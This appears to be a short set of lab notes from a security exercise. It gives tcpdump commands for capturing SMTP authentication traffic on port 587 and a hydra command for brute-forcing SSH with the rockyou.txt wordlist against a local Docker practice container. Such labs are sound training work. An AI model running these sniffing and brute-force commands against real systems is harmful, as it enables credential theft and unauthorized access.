attack_is_the_best_defense
1. sniffing
tcpdump --list-interfaces
tcpdump --interface any -nn port 587
tcpdump --interface any -nn port 587 -w packets.pcap ------------------------ run at the same time ------> ./user_authenticating_into_server
cat packets.pcap
tcpdump -nn -A -r packets.pcap

2. hydra and rockyou.txt
snap install docker
docker run -p 2222:22 -d -ti sylvainkalache/264-1
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
cat rockyou.txt | head -n 10
hydra -l sylvain -P ./rockyou.txt ssh://127.0.0.1 -s 2222 -V -F
